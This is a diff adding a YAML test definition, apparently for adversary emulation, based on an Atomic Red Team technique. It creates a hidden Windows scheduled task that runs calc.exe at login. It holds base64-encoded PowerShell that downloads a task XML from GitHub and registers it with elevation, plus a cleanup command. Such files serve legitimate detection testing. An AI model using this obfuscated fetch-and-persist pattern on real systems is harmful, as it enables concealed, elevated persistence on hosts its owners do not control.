@@ -1,0 +1,21 @@
+- id: dc730cc0-65f0-5d1e-b10b-f88c75070458
+  name: Soumaia ART Tests - Import XML Schedule Task with Hidden Attribute
+  description: "Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. \nThis technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2. (requires elevation)"
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1053.005
+    name: 'Scheduled Task/Job: Scheduled Task'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAwADUAMwBfADAANQBfAFMAQwBUAEEAUwBLAF8ASABJAEQARABFAE4AXwBBAFQAVABSAEkAQgAuAHgAbQBsACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMAA1ADMAXwAwADUAXwBTAEMAVABBAFMASwBfAEgASQBEAEQARQBOAF8AQQBUAFQAUgBJAEIALgB4AG0AbAAiACkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAGkAZwBuAG8AcgBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADAANQAzAC4AMAAwADUALwBzAHIAYwAvAFQAMQAwADUAMwBfADAANQBfAFMAQwBUAEEAUwBLAF8ASABJAEQARABFAE4AXwBBAFQAVABSAEkAQgAuAHgAbQBsACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABUADEAMAA1ADMAXwAwADUAXwBTAEMAVABBAFMASwBfAEgASQBEAEQARQBOAF8AQQBUAFQAUgBJAEIALgB4AG0AbAAiAAoA
+          }
+          $xml = [System.IO.File]::ReadAllText(".\T1053_05_SCTASK_HIDDEN_ATTRIB.xml")
+          Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
+        cleanup: |-
+          Unregister-ScheduledTask -TaskName "atomic red team" -confirm:$false >$null 2>&1
+        payloads:
+        - T1053_05_SCTASK_HIDDEN_ATTRIB.xml
